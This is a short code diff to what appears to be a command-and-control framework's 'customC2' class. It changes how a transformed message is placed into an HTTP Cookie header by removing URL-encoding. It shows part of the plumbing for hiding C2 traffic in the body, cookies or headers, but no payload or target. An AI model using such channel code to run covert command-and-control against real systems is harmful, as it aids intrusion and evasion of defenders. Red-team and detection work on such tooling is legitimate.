@@ -375,7 +375,7 @@ class customC2 extends baseC2 {
         } else if (msgLocation === "body") {
             bodyStr = transformed;
         } else if (msgLocation === "cookie") {
-            headers["Cookie"] = msgName + "=" + encodeURIComponent(transformed);
+            headers["Cookie"] = msgName + "=" + transformed;
         } else if (msgLocation === "header") {
             headers[msgName] = transformed;
         } else {
